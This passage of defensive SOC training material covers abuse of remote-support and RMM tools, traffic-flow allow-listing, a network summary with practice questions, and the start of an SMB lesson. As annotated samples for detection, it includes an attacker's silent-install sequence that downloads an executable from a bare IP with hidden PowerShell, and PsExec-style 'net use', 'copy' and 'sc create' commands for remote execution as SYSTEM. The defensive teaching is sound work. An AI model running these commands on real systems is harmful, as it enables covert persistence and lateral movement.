docs.title: Remote Access Tools, Is Any Protocol Safe?, and the Network Summary
Remote Access Tools, Is Any Protocol Safe?, and the Network Summary
docs.text:
What this page covers

The last idea of the protocols section: stop thinking only in protocols. Any remote access or administration tool — built into the OS or bought from a vendor, even one that only ever speaks HTTPS — gives whoever controls it hands-on-keyboard access, and ransomware crews use commercial remote-support and RMM (remote monitoring and management) tools as a standard step. What these tools look like on a host and on the network: a silent install command line by line, the events it leaves (4688/Sysmon 1, 7045/4697, Sysmon 3 and 22), the tool's own connection log, and the outbound-to-relay traffic pattern in conn.log/ssl.log. Then the question "is any protocol safe?" — no, anything that moves data can move evil data — and what to do instead: metadata logging, protocol enforcement, flow-based detection, outbound default-deny, and above all a known traffic-flow matrix that turns detection into allow-listing. Finally, a summary of the whole network part (DNS, HTTP(S), email, other protocols), mapping each attack stage to the evidence you should be able to see. Practice questions with explanations at the end.

Labels

[Supplement] = practical material you need to know, [Correction] = a commonly repeated claim that is wrong or outdated, [Changed]/[Caution] = what has changed recently and what is risky to do the old way. Hostnames, domains, accounts, IDs and IPs are invented for illustration (.example, documentation and private IPs). Product names are mentioned only because they are widely documented as abused; their own log formats vary by version.

docs.title: The 8 key points
docs.text:
1. The protocol is not the point; the capability is. Anything that lets one person control another computer — RDP, SSH, WinRM, VNC, or a commercial remote-support app over HTTPS — is a remote-control channel, and attackers need one in nearly every intrusion.
  2. Commercial remote-access and RMM tools are attacker favourites because they are legitimately signed, often ignored by antivirus, encrypted, reach the internet through the vendor's relay cloud on 443, survive reboots as a service, and look like IT work.
  3. A leaked ransomware-group playbook (2021) told affiliates to install a remote-support app on idle hosts and an RMM agent registered to the attacker's own trial account on others — as persistence. This is now a routine pattern, not a rare trick.
  4. On the host, look for: process creation of the tool (4688 / Sysmon 1) from unusual paths or parents, a new service (7045 / 4697), DNS queries and connections to the vendor's relays (Sysmon 22 / 3), and the tool's own connection log.
  5. The defence is an allow-list. Pick one approved remote tool, block or alert on every other one (application control plus DNS/proxy blocking), and protect the approved tool's console like a domain admin account.
  6. No protocol is "safe". Any protocol that can carry data can carry commands, stolen files or a tunnel. What matters is whether this use is expected here, between these two, at this time.
  7. Allow-listing beats signatures. If you know which zones may talk to which over which protocols, every out-of-place connection is suspicious — whether the attacker uses a known tool or a brand-new one.
  8. Network summary: understand your architecture and flows; know what you collect and where you can see; DNS, HTTP(S) and SMTP carry most attack traffic; and the "other" protocols (DHCP, SMB, SSH, RDP/VNC, WinRM, FTP, ICMP, remote tools) carry most of what happens after the first foothold.

docs.title: Any remote access or administration tool
Why a tool can matter more than a protocol
docs.text:
Earlier pages looked at protocols one at a time: SMB, SSH, RDP and VNC, PowerShell remoting. Each is dangerous for the same reason: it lets someone sitting elsewhere operate a computer. That capability does not belong to any particular protocol. A remote-support app that tunnels a full desktop through HTTPS on port 443 gives exactly the same power as RDP on 3389 — and it is much harder to spot, because 443 is where everything else goes too.

An analogy. Your building has front doors with guards (the firewall), and the guards check the obvious doors: the RDP door, the SSH door. A remote-support tool is a spare key cut by a reputable locksmith and handed to whoever asked for it. It opens the door from the inside, the guards see "the locksmith's van" (a well-known vendor's servers) and wave it through, and the key works every day until someone notices it exists.

The technical reality: most commercial remote-support and RMM tools work like this.

[victim PC: agent/app] --outbound TLS 443--> [vendor relay cloud] <--outbound TLS 443-- [operator: console/app]
  • The agent on the controlled PC makes an outbound connection to the vendor's relay servers and keeps it open. No inbound port needs to be opened, so the firewall and NAT never get in the way.
  • The operator (IT staff — or the attacker) also connects outbound to the same cloud and is joined to the agent's session.
  • Everything is encrypted end to end or at least to the relay, so a network sensor sees only "a long TLS session to a remote-support vendor."

From the attacker's side, that is close to ideal:

Property Why the attacker likes it Signed by a real vendor Antivirus and EDR often allow it; application control may already trust the signer Outbound to the vendor's cloud on 443 Passes firewalls and proxies; blends with normal HTTPS Installs as a service, starts at boot Persistence without writing any malware Full GUI, file transfer, remote shell Hands-on-keyboard control, upload tools, download data Used by real IT and MSPs "Is this ours?" is a hard question to answer quickly Free trials, self-registration The attacker can register their own account in minutes

The categories you will meet:

  • Built into the OS: RDP, Remote Assistance, Quick Assist (Windows), SSH, WinRM, VNC-style screen sharing on macOS.
  • Commercial remote support: desktop-sharing apps that connect by an ID or code through the vendor's relay.
  • RMM platforms: agent-based fleet management used by IT departments and MSPs (managed service providers) — scripting, software deployment, remote shell, remote desktop for thousands of machines from one web console.
  • Tunnels and developer tools: IDE remote-tunnel features and reverse-tunnel services that expose a local shell or port through a cloud relay.
  • Remote-access hardware: IP-KVM devices plugged into a machine's keyboard, video and mouse ports.

docs.title: What playbooks tell affiliates to do
docs.text:
In 2021 an affiliate of a large ransomware operation leaked the group's training material. Among the steps after gaining access was a short "persistence" section. Paraphrased: on hosts nobody uses, install a well-known remote-support app downloaded directly from its vendor; on other hosts, create an account on an RMM vendor's website, download the agent installer from that account, copy it to the victim and run it, then delete the installer.

Why that is clever:

  • Nothing malicious is installed. The binaries are the vendor's own, properly signed.
  • The RMM agent "phones home" to the vendor's cloud and appears in the attacker's console. If the defenders find and remove the attacker's malware, the attacker still has a fully working back door through a legitimate product.
  • The traffic is TLS to a reputable SaaS domain.

Groups since then — and initial access brokers who sell access to them — use the same idea, and phishing campaigns increasingly deliver a legitimate RMM installer as the "payload" instead of malware.

docs.title: What a silent install looks like
docs.text:
Remote-support apps and RMM agents usually support unattended (silent) installation, because IT departments need it. The attacker uses the same switches. A representative sequence, as recorded in process-creation logs on WS-SYD-0142:

powershell.exe -nop -w hidden -c "iwr https://203.0.113.45/rs.exe -OutFile C:\ProgramData\rs.exe"
C:\ProgramData\rs.exe --install "C:\ProgramData\RS" --start-with-win --silent
cmd.exe /c "echo Winter2026! | C:\ProgramData\RS\rs.exe --set-password"
msiexec.exe /i C:\Users\Public\AGENT_INSTALLER.msi /qn
cmd.exe /c del C:\Users\Public\AGENT_INSTALLER.msi

Line by line:

  • powershell.exe -nop -w hidden -c "iwr ... -OutFile ..." — download the remote-support executable. -nop = no profile, -w hidden = no window, iwr = Invoke-WebRequest. Downloading from a bare IP rather than the vendor's site is a further warning sign; some attackers do download from the vendor directly, which looks cleaner.
  • rs.exe --install "C:\ProgramData\RS" --start-with-win --silent — install into a chosen folder, register to start with Windows (a service), and show nothing to the user. Switches like these are documented by vendors for mass deployment.
  • echo Winter2026! | rs.exe --set-password — pipe a password into the app to enable unattended access: anyone with the app's ID and this password can connect at any time without the user clicking "accept".
  • msiexec.exe /i AGENT_INSTALLER.msi /qn — install an RMM agent from an MSI package. /i = install, /qn = quiet, no UI. The MSI is tied to the account it was downloaded from — here, the attacker's.
  • del AGENT_INSTALLER.msi — remove the installer to tidy up, exactly as the playbook says. The installed agent stays.

docs.title: The traces it leaves
docs.text:
Process creation — Security 4688 / Sysmon 1. 4688 ("a new process has been created") is logged by Windows when process-creation auditing is on; Sysmon event 1 is the richer version with hashes, the parent process and the full command line. Attackers care because this is the event that shows what they ran. For remote tools, look at:

EventID: 1 (Sysmon Process Create)
UtcTime: 2026-11-19 02:11:37.402
Image: C:\ProgramData\RS\rs.exe
CommandLine: "C:\ProgramData\RS\rs.exe" --install "C:\ProgramData\RS" --start-with-win --silent
User: CORP\j.kim
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Hashes: SHA256=6F1C...E09A
Signature: RemoteSupport Vendor Ltd (Valid)
  • Image in C:\ProgramData\... — legitimate IT deployments normally install under C:\Program Files\. A remote tool running from ProgramData, Users\Public, Temp or Downloads is suspicious.
  • CommandLine — the silent-install and auto-start switches.
  • ParentImage: powershell.exe — a hidden PowerShell started the installer. Your software-deployment system would be the normal parent.
  • Signature ... (Valid) — the binary is genuinely signed. This is why signature-based tools let it through. Validity of the signature tells you nothing about who is using it.

New service — System 7045 / Security 4697. 7045 ("A service was installed in the system") is written by the Service Control Manager to the System log; 4697 is the Security-log equivalent when "Audit Security System Extension" is enabled. Attackers care because a service is the easiest way to survive reboots and run as SYSTEM.

Log: System   EventID: 7045   Provider: Service Control Manager
Service Name:  RS Remote Service
Service File Name: "C:\ProgramData\RS\rs.exe" --service
Service Type:  user mode service
Service Start Type: auto start
Service Account: LocalSystem
  • Service File Name points into ProgramData — the same odd path.
  • auto start + LocalSystem = runs at every boot with the highest local privileges.

DNS and network — Sysmon 22 / Sysmon 3. Sysmon 22 records each DNS query with the process that made it; Sysmon 3 records network connections with the process. Together they answer "which program talked to which vendor":

EventID: 22  Image: C:\ProgramData\RS\rs.exe  QueryName: relay-41.rs-vendor.example  QueryResults: 198.51.100.77
EventID: 3   Image: C:\ProgramData\RS\rs.exe  DestinationIp: 198.51.100.77  DestinationPort: 443  Protocol: tcp  Initiated: true

The tool's own logs. Most remote-support apps keep a connection log in their program-data or user-profile folder. Formats vary by product and version, but they typically record each session's time, direction (incoming/outgoing), the remote peer's ID and how it authenticated (password, token, user accepted). A simplified example:

Incoming  2026-11-19 02:14  Passwd  RS-ID 718 334 902   user: j.kim
Incoming  2026-11-19 03:40  Passwd  RS-ID 718 334 902   user: j.kim
Incoming  2026-11-20 01:02  Token   RS-ID 718 334 902   user: j.kim
  • Incoming — someone connected to this PC.
  • Passwd / Token — authenticated with the unattended password, later with a saved token: nobody clicked "accept".
  • The same remote ID at 02:00–03:00 on consecutive nights — the attacker's ID, and an indicator you can hunt for on other hosts' logs.

RMM platforms also keep server-side audit logs in the vendor console: which technician account ran which script on which device. If the attacker used your legitimate RMM, that console log is the best evidence there is — and the console account is what they stole.

On the network — conn.log and ssl.log.

conn.log: ts=2026-11-19T02:11:52Z id.orig_h=10.20.30.41 id.resp_h=198.51.100.77 id.resp_p=443 proto=tcp service=ssl duration=10813.4 orig_bytes=96402117 resp_bytes=1840221 conn_state=SF
ssl.log:  ts=2026-11-19T02:11:52Z id.orig_h=10.20.30.41 id.resp_h=198.51.100.77 server_name=relay-41.rs-vendor.example version=TLSv13 established=T
  • duration=10813.4 — a single TLS session lasting about three hours. Normal browsing makes many short connections; a remote-control session is one long one.
  • orig_bytes=96402117 (about 92 MB out from the PC) vs resp_bytes=1840221 (about 1.8 MB in) — the PC sends a steady stream (screen updates) and receives only small inputs (keystrokes, mouse moves). That is the shape of someone watching and controlling this desktop. A large burst out can also mean files being pulled off the machine, so check the tool log for file transfers.
  • server_name=relay-41.rs-vendor.example — the SNI names the vendor's relay. This is the cheapest detection there is: a list of remote-tool vendor domains and an alert when an unapproved one appears.

docs.title: Built-in tools and the "help desk" trick
docs.text:
Not every attacker installs anything. Windows Quick Assist is built in and signed by Microsoft. From 2024, ransomware operators were documented flooding a user's mailbox with spam ("email bombing"), then calling or messaging them over a collaboration app as "IT support" offering to fix it, and asking the user to open Quick Assist and share the code. The user grants control; the attacker installs their tools.

There is no exploit and no malware at that stage, only a legitimate tool and a convinced user. Evidence: the Quick Assist process (QuickAssist.exe) starting on a machine where IT does not use it, at the time of an inbound external call, followed by downloads and new processes. Many organisations now remove or block Quick Assist and tell users that IT will never cold-call them to request a remote session.

docs.title: Defending against remote tools
docs.text:
1. Choose one approved remote tool (or a short list) and write it down: which product, which tenant/account, which admins.
  2. Block the rest. Application control (for example WDAC or AppLocker rules by signer/product) on endpoints, and DNS/proxy blocking of other vendors' relay domains. Community-maintained lists of remote tools, their binaries and domains exist and save a lot of work.
  3. Alert on any unapproved tool, on installs outside software deployment, and on the approved tool connecting to a tenant/account that is not yours (many RMM products expose the account ID in their config or traffic).
  4. Protect the approved tool's console like Tier 0. It can run code as SYSTEM on every managed machine. Enforce phishing-resistant MFA, restrict console logins, and send its audit log to the SIEM.
  5. Patch internet-facing remote-access products quickly. Remote-support servers and RMM products have had critical vulnerabilities that were exploited within days.
  6. Hunt regularly: services and installed software matching remote-tool names or signers; long-lived 443 sessions from workstations to remote-tool vendors; the same remote ID across several hosts.

docs.title: Is any protocol safe?
docs.text:
Short answer: no. A protocol is just an agreed way to move data. If it can move data, it can move a stolen database, a command, or someone else's traffic inside it. The previous pages showed this over and over:

Protocol Looks harmless because... ...but it carried DNS "just name lookups" Tunnels and C2 ICMP "just ping" Payloads and tunnels HTTPS "just web browsing" C2, exfiltration, remote-support sessions SSH "admin tool" Inbound RDP through an outbound tunnel SMB "file sharing" Remote service creation and execution DHCP "just addressing" Rogue DHCP servers and DNS takeover

A protocol that cannot deliver data is useless, so the answer cannot be "find the safe protocol". It has to be "recognise unusual use of every protocol." That needs several layers.

docs.title: The layers that work together
docs.text:
• Deep packet inspection that logs metadata for every transaction. Tools like Zeek don't keep the full traffic; they write a line per DNS query, HTTP request, TLS handshake, SMB file access, SSH session. This metadata is what makes the earlier pages' detections possible (Zeek conn.log).
  • Protocol compliance on the firewall. Modern firewalls identify the application, not just the port: "443 must be TLS", "53 must be DNS". An SSH handshake on 443 (as in this example) or non-DNS data on 53 is then blocked or flagged.
  • Network security monitoring (NSM). Someone (and some analytics) actually looking at the alerts, metadata and packets — the work this whole part has described.
  • Layer 3/4 detection on top. Even when content is encrypted, IPs, ports, sizes, timing and duration still show beaconing, tunnelling and bulk transfers (beaconing and C2).
  • Outbound default deny. Servers and workstations should not be able to reach any internet host on any port. Allow what is needed (often only via the proxy) and deny the rest. This alone kills many tunnels and exfiltration paths.
  • Well-defined subnets and traffic flows. The most powerful layer, explained next.

docs.title: Known flows turn detection into allow-listing
docs.text:
If you can write down which zones should talk to which, over what, then everything else is an anomaly — no signature needed. A small example traffic-flow matrix:

From To Allowed Notes User VLAN 10.20.30.0/24 Internet HTTP/HTTPS via proxy only No direct 443, no SSH, no FTP User VLAN Server VLAN 10.20.10.0/24 HTTPS to app servers, SMB to file servers Not WinRM, not RDP User VLAN User VLAN Nothing Workstations never talk to each other Admin jump hosts 10.20.5.0/28 Server VLAN RDP, WinRM, SSH The only source for admin protocols Server VLAN Internet Patch/update endpoints only Servers don't browse DHCP/DNS servers Anywhere internal DHCP, DNS Only these answer DHCP and DNS

Now read these conn.log lines against it:

id.orig_h=10.20.30.41  id.resp_h=10.20.30.77  id.resp_p=445   service=smb
id.orig_h=10.20.30.41  id.resp_h=10.20.10.15  id.resp_p=5985  service=http
id.orig_h=10.20.10.15  id.resp_h=203.0.113.90 id.resp_p=22    service=ssh
id.orig_h=10.20.30.52  id.resp_h=198.51.100.77 id.resp_p=443  service=ssl
  • Line 1: workstation → workstation on 445. The matrix says user-to-user is nothing. That is the classic lateral-movement signal (SMB).
  • Line 2: workstation → server on 5985 (WinRM). Admin protocols are only allowed from jump hosts. Someone is remoting from a user laptop (PowerShell remoting).
  • Line 3: server → internet on 22. Servers only reach update endpoints. Outbound SSH from a server is exfiltration or an inbound tunnel (SSH).
  • Line 4: workstation → internet on 443 directly, not via the proxy. The matrix says proxy only — so this either bypasses policy, or the firewall allows it and should not. The destination is a remote-support relay (above).

None of these needed a malware signature. Each is just "not on the list." That is why allow-listing is one of the strongest detection strategies: it catches known and unknown techniques alike, because it is built from what is normal for you, not from what attackers did elsewhere. The price is that you must know your network, keep the matrix up to date, and tune exceptions — which is why network architecture knowledge is the first thing a SOC needs.

docs.title: Summary of the network part
docs.text:
The pages of this part, taken together, come down to a few ideas.

1. Understand the pieces of your network and how traffic flows. What are the segments? What controls separate them? Where does internet traffic leave? A SOC that cannot answer these cannot tell normal from abnormal, and cannot build the flow matrix above.

2. Know what you collect and where you can see. Full packet capture, flow records, protocol metadata (Zeek-style logs), proxy, DNS and mail logs, firewall logs, endpoint telemetry — each covers different stages, and each sensor only sees what passes it. Walk an attack through your network and ask at each step: would we have evidence?

Attack stage Example Evidence you should have Where it was covered Delivery Phishing email with a link Mail headers, Authentication-Results:, mail platform logs Email Execution / first C2 User clicks; host resolves and contacts C2 DNS logs, proxy/HTTP logs, TLS SNI/JA4 DNS, HTTP, HTTP(S) analysis Discovery / lateral movement Laptop → server over SMB, WinRM, RDP conn.log, smb_*, 4624/4672/7045, Sysmon SMB, SSH/RDP, WinRM Persistence Remote-support app or RMM agent installed 4688/Sysmon 1, 7045/4697, vendor SNI This page Staging Data copied to a server in the DMZ SMB file logs, large internal transfers SMB Exfiltration Out over HTTPS, FTP, SSH, DNS or ICMP Flow volume, ftp.log, ssh.log, DNS/ICMP anomalies FTP/ICMP, DNS abuse Attribution of IPs Which device had that IP? DHCP leases, 4624/4768 DHCP

If any row is empty for your organisation, that is a gap to raise.

3. DNS, HTTP(S) and SMTP are of primary importance. Almost every intrusion uses at least one of them. DNS and HTTP(S) let you find and follow attack traffic — the lookup, the download, the beacon. SMTP is complicated, phishing is a primary initial-access vector, and understanding authentication technology and headers is how you identify spoofing.

4. The other common protocols are all used for evil too. DHCP is your IP-to-device record and a target for rogue servers; SMB, SSH, RDP/VNC, WinRM and remote tools are how attackers move and stay; FTP, ICMP (and DNS, and HTTPS) are how data leaves. Know what each looks like when normal, so the abnormal stands out.

The next part moves from the network to the endpoints themselves — hosts, logs and files.

docs.title: The 2026 view
docs.text:
[2026 Current] Still valid

Everything on this page holds, and the remote-tool point has become more important. Abuse of legitimate remote-access and RMM software is one of the most consistently reported intrusion techniques in 2024–2026 incident-response reports, for both initial access and persistence. MITRE ATT&CK covers it as T1219 Remote Access Tools. "If it can move data, it can be abused", outbound default-deny, protocol-aware firewalls and allow-listing of known flows remain the core defensive ideas, and the network part's emphasis on DNS, HTTP(S) and email still matches where attacks start.

[Changed] What has changed

  • ATT&CK reorganised the technique. T1219, formerly "Remote Access Software", is now "Remote Access Tools" with sub-techniques for IDE tunnelling (T1219.001), remote desktop software (T1219.002) and remote-access hardware such as IP-KVMs (T1219.003).
  • Government guidance. A joint US advisory in January 2023 (CISA and partners) described criminals sending phishing that led victims to install legitimate remote-support software, and recommended application control and auditing of RMM tools. Similar warnings have been repeated since.
  • "Help desk" social engineering with built-in tools. Since 2024, email bombing followed by fake IT calls through collaboration apps and Quick Assist sessions has been documented as a route to ransomware. The tool is Microsoft-signed and needs no install.
  • The tools themselves became targets. Critical flaws in remote-support/RMM server products were exploited at scale (for example in a widely used remote-support server product in early 2024, and in another remote-support product used against MSPs in 2025), and one major remote-support vendor disclosed a breach of its production systems in 2024 and rotated its code-signing certificate. Your approved tool is part of your attack surface.
  • Phishing delivers RMM instead of malware. Many 2025–2026 campaigns install a genuine, signed RMM agent tied to the attacker's account as the first-stage "payload", sidestepping malware detection completely.
  • Community resources now track remote tools, their binaries, paths and network domains specifically for defenders, which makes the allow/deny approach practical.
  • Identity and cloud shifted the flow matrix. With SaaS, VPN replacement (ZTNA) and remote work, "zones" now include identities, devices and cloud tenants, not just subnets. The allow-list idea is the same, but it is enforced in identity and access policies as much as in firewalls.

[Caution] Wrong or risky to do the old way

  • Don't trust a valid code signature as evidence that a remote tool is benign. Signed by the vendor is exactly what attackers want.
  • Don't only watch "remote-admin ports" (3389, 22, 5985, 5900). Today's remote control mostly runs over 443 to vendor clouds.
  • Don't tolerate "every team picks its own remote tool." Without a single approved tool, you cannot tell IT from intruders.
  • Don't treat the RMM console as an ordinary SaaS login. It is code execution as SYSTEM on every managed machine; protect it with phishing-resistant MFA and monitor its audit log.
  • Don't block-list your way to safety. New remote tools appear constantly; enforce an allow-list and alert on everything else.
  • Don't assume encrypted means invisible. SNI, JA4, duration, volume and the process making the connection still identify most remote-tool sessions.

docs.title: Question 1
docs.text:
On WS-SYD-0142 (user CORP\j.kim) you find: Sysmon 1 for C:\ProgramData\RS\rs.exe --install ... --start-with-win --silent with parent powershell.exe, a System 7045 for RS Remote Service running as LocalSystem with auto start, and the next night a 3-hour TLS session to relay-41.rs-vendor.example. The binary is validly signed. Your organisation's only approved remote tool is a different product. Explain each piece of evidence and what you would do next.

Answer and explanation
  • Sysmon 1 (process create): the remote-support app was installed silently into ProgramData, set to start with Windows, launched by a hidden PowerShell — not by your software-deployment system. That is attacker-style installation.
  • 7045 (new service, System log): the install created an auto-start service as LocalSystem — persistence that survives reboots with full privileges.
  • Long TLS session to the vendor relay: a remote-control session through the vendor's cloud — someone operating the machine for three hours at night.
  • Valid signature: explains why AV did not stop it; says nothing about who is using it.

Since it is not the approved tool, treat it as a compromise with an attacker back door. Next: isolate the host; collect the tool's own connection log to get the remote ID and session times; hunt for the same ID, binary hash, service name and relay SNI on all hosts; find the PowerShell that ran the download (4104, Sysmon 1 parent chain) and how the attacker got in; check what was done during the sessions (files, new processes, accounts). Then block the vendor's domains and the binary by application control, and remove the service. Don't just uninstall it — the attacker may have other footholds.

docs.title: Question 2
docs.text:
A colleague proposes: "Let's make a list of safe protocols to allow and block everything else at the firewall. DNS, HTTPS and ICMP are safe, so we'll allow those out from every host." What is right and wrong about this, and what would you propose instead?

Answer and explanation

Right: blocking by default and allowing only what is needed (outbound default deny) is a strong control.

Wrong: there are no "safe" protocols. DNS can carry tunnels and C2; HTTPS carries C2, exfiltration and remote-support sessions; ICMP echo can carry any payload. Allowing them from every host to anywhere leaves the three most popular covert channels wide open.

Instead: allow by who, to where, how: workstations use the internal DNS resolvers only (no direct 53 out); web goes through the proxy (no direct 443); ICMP echo out only where needed (keeping essential ICMP types like "fragmentation needed"); servers reach only update endpoints. Write it down as a traffic-flow matrix, enforce it with a protocol-aware firewall, log metadata for what is allowed (DNS, proxy, TLS), and alert on anything that doesn't match. Then even an allowed protocol used in an unusual way (huge DNS TXT volume, a 3-hour TLS session to a remote-tool vendor) stands out.

docs.title: Question 3
docs.text:
Using the traffic-flow matrix on this page, which of these connections should alert, and what would each most likely mean?

a) 10.20.5.3   -> 10.20.10.15  tcp/3389  rdp
b) 10.20.30.41 -> 10.20.30.88  tcp/135   dce_rpc
c) 10.20.10.22 -> 203.0.113.18 tcp/21    ftp
d) 10.20.30.60 -> 10.20.2.10   udp/53    dns
e) 10.20.30.61 -> 10.20.30.1   udp/67    dhcp   (10.20.30.61 answering DHCPOFFERs)
Answer and explanation
  • a) No alert. 10.20.5.3 is in the admin jump-host range 10.20.5.0/28, and RDP to servers is allowed from there. (Still log it, and check the account used.)
  • b) Alert. Workstation → workstation is "nothing", and 135 is RPC — used for remote service control, WMI and scheduled tasks. Likely lateral movement or remote execution between user PCs.
  • c) Alert. A server reaching the internet on FTP — servers only reach update endpoints. Likely exfiltration (check ftp.log for STOR and sizes).
  • d) No alert, assuming 10.20.2.10 is the internal DNS server. Clients querying the internal resolver is the expected flow. (If it is not a DNS server, alert.)
  • e) Alert. Only the approved DHCP servers should answer DHCP. A workstation sending DHCPOFFERs is a rogue DHCP server — it could hand out itself as gateway or DNS and intercept traffic (DHCP).

The point: none of these needed a signature. Each decision came from comparing the flow with what is known to be normal.

docs.title: SMB — Why Attackers Love It, Versions and Negotiation, Typical Attacks
SMB — Why Attackers Love It, Versions and Negotiation, Typical Attacks
docs.text:
What this page covers

What SMB (Server Message Block) is, why it is one of the most attacked and most successfully abused services inside a network, and why "the same local admin password on every PC" turns one phished laptop into a whole-network compromise. The SMB versions (dialects), how client and server agree on one, why SMB1 must be gone and what that does and doesn't mean for SMB2. Then the two families of SMB attack — logging in with valid credentials (PsExec style) and exploiting the SMB service itself (EternalBlue style) — followed step by step, with the Windows events (4624, 4672, 5140, 5145, 7045, 4697, 4688, Sysmon 1 and 3) and Zeek logs each step leaves. Practice questions with explanations at the end.

Labels

[Supplement] = practical material you need to know, [Correction] = a commonly repeated claim that is wrong or outdated, [Changed]/[Caution] = what has changed recently and what is risky to do the old way. Hostnames, domains, accounts, IPs and file names are invented for illustration (.example, documentation and private IPs).

docs.title: The 8 key points
docs.text:
1. SMB is the native Windows file and printer sharing protocol (Samba implements it on Linux). It runs on TCP 445 (and the older NetBIOS route on TCP 139), and in a Windows domain it is open on almost every machine by default.
  2. Port 445 should never be reachable to or from the internet. Its danger is inside: once an attacker has one foothold, SMB is available almost everywhere for reconnaissance and lateral movement.
  3. SMB is not just file copying. With an administrator's username and password for a remote machine, SMB lets you run any program there and get an interactive command line — similar in power to SSH, but it needs admin rights.
  4. That is why sharing the same admin password across machines (for example the built-in local Administrator) is one of the deadliest mistakes: compromise one, and you can log in to all of them.
  5. Client and server each list the versions (dialects) they speak and use the highest one both support. Current Windows speaks SMB 3.1.1.
  6. SMB1 must be off. Its weak design is what the worst SMB exploits of the past (EternalBlue and its siblings, used by WannaCry and NotPetya) relied on.
  7. SMB attacks fall into two families: valid credentials + a remote execution tool (PsExec style) and a server-side exploit against unpatched SMB (EternalBlue style). Either way, the attacker usually ends up as Administrator or SYSTEM, not as a normal user.
  8. As admin, the attacker can dump the credentials of everyone logged on to that machine (Mimikatz and similar), get more accounts, and move again — so open SMB between workstations makes a bad situation worse very quickly.

docs.title: What SMB is
docs.text:
When you open \\SRV-FS-0001\Finance in File Explorer, map a drive letter, print to a shared printer, or when a domain PC downloads Group Policy from \\corp.victim.example\SYSVOL, that is all SMB. It is the protocol Windows uses to say "let me open, read, write and lock files on that other computer," and much more besides, because SMB is also the carrier for named pipes — channels that let one computer call management functions on another (remote service control, the registry, scheduled tasks and so on, via DCE/RPC).

  • Windows native. Every Windows client and server has an SMB client and an SMB server (the "Server" service, LanmanServer) built in.
  • Linux too. Samba is the open-source implementation, so Linux file servers and NAS boxes speak SMB as well.
  • Ports. TCP 445 is "SMB directly over TCP" and is what modern systems use. TCP 139 is the older route, SMB over NetBIOS session service (with UDP 137/138 for NetBIOS names and datagrams). Seeing 139 today usually means old devices or old settings.
  • Open by default in a domain. Domain PCs need SMB to reach SYSVOL and NETLOGON on the domain controllers, administrators use it to manage PCs, and the Windows firewall on a domain profile commonly allows inbound "File and Printer Sharing". The result: in many networks, every PC can reach 445 on every other PC.

Think of a large office building. Each office (PC) has a front door for its own staff, but the building also has a staff-only service corridor behind every office, used by maintenance to reach any room with a master key. That corridor is SMB. It is never connected to the street (the internet), but anyone who gets inside the building and gets hold of the master key (an admin password) can walk into every office.

Technically: SMB has administrative shares that Windows creates automatically — C$ (the whole C: drive), ADMIN$ (the C:\Windows folder) and IPC$ (the entry point for named pipes). Only administrators can use C$ and ADMIN$. Those three shares are the "master key doors" that attack tools use.

docs.title: Admin credentials = remote command execution
docs.text:
The key point as a defender: with admin credentials for a machine, SMB gives you full remote control of it. The pieces are all ordinary Windows features:

  1. Authenticate to the target over SMB (NTLM or Kerberos).
  2. Copy a program to \\target\ADMIN$ (that is, into C:\Windows).
  3. Open the named pipe \\target\IPC$\svcctl (the Service Control Manager's remote interface) and create a service that runs that program.
  4. Start the service. Services run as SYSTEM, the highest local privilege.
  5. Talk to the program through more named pipes to get an interactive command line.

That is exactly what Sysinternals PsExec does, and what many attack tools copy. To show that it really is just built-in features, here is the manual version an attacker (or administrator) could type:

C:\> net use \\10.20.30.52\ADMIN$ /user:LT-FIN-0419\Administrator *
C:\> copy updater.exe \\10.20.30.52\ADMIN$\updater.exe
C:\> sc \\10.20.30.52 create UpdSvc binPath= "C:\Windows\updater.exe" start= demand
C:\> sc \\10.20.30.52 start UpdSvc

Line by line:

  • Line 1: net use connects to the ADMIN$ share on 10.20.30.52 as the local Administrator of that machine (LT-FIN-0419\Administrator). * makes it prompt for the password. If it answers The command completed successfully., the credentials are valid and they are admin on that machine (non-admins get System error 5 has occurred. Access is denied.).
  • Line 2: copy writes updater.exe into C:\Windows on the remote machine, over SMB.
  • Line 3: sc \\host create uses the remote service control interface (the svcctl pipe over SMB) to register a new service. binPath= is the program to run; the space after = is required by sc's odd syntax. Output on success: [SC] CreateService SUCCESS.
  • Line 4: sc \\host start starts it. The program now runs as SYSTEM. If it isn't a real service, sc reports error 1053 ("did not respond to the start or control request in a timely fashion") — but the program has already started, which is all the attacker needs.

Compare SSH: SSH also gives a remote shell, but any user with an account can log in. SMB remote execution needs admin rights on the target — which is why the next point matters so much.

docs.title: The shared local admin password problem
docs.text:
Many organisations build PCs from one image, and the image has the same built-in local Administrator password on every machine. Now follow the attacker:

  1. One user opens a phishing attachment. The attacker controls LT-FIN-0412.
  2. The attacker gets admin on that PC (an exploit, or the user is already a local admin) and extracts the local Administrator's password hash from the SAM database.
  3. That same password (or just its NTLM hash — see pass-the-hash) works on every other PC built from the same image.
  4. Port 445 is open between all PCs, so the attacker uses SMB to run code on all of them.

Back to the building: it's as if every office lock was keyed to the same key. Steal the key from one office and the whole building is open.

So one phished machine + shared admin passwords + flat network with 445 open everywhere = full compromise. The fix is not exotic: a unique local admin password per machine (Windows LAPS — see Changed), firewall rules that block 445 between workstations, and admin accounts that are never used on ordinary PCs.

docs.title: Worms ride the same road
docs.text: If the malware automates those steps, it becomes a worm. WannaCry (May 2017) spread by the EternalBlue exploit over SMB; NotPetya (June 2017) combined EternalBlue/EternalRomance with stolen credentials and PsExec/WMI, so even fully patched machines fell if an admin credential was found. That mix is why both spread through entire companies in hours.

docs.title: The dialects
docs.text:
SMB has had many versions over the years. Each is called a dialect.

Dialect First shipped with What it added (simplified) SMB1 / CIFS Windows NT 4.0 era; the main dialect up to XP / Server 2003 R2 The original. No real integrity protection on negotiation, no encryption, very chatty. CIFS is the name of the NT-era SMB1 dialect SMB 2.0.2 Windows Vista / Server 2008 A complete redesign: far fewer commands, larger reads and writes, better signing (HMAC-SHA256) SMB 2.1 Windows 7 / Server 2008 R2 Performance (leasing, larger MTU) SMB 3.0 Windows 8 / Server 2012 Encryption (AES-CCM), multichannel, clustering features SMB 3.0.2 Windows 8.1 / Server 2012 R2 Small improvements; option to remove SMB1 SMB 3.1.1 Windows 10 / Server 2016 Pre-authentication integrity (SHA-512 hash of the negotiation, blocks downgrade), AES-GCM encryption. Later Windows added AES-256, signing with AES-GMAC, and SMB over QUIC

[Correction] You'll often see "SMB 3.1" in lists. The actual dialect number is 3.1.1 (0x0311); there is no separate 3.1.

[Supplement] "SMB2" and "SMB3" are not two separate protocols. All 2.x and 3.x dialects use the same SMB2 packet format; 3.x is just higher dialect numbers with more features. That matters for the "turn off SMB2" advice below.

docs.title: How client and server pick one
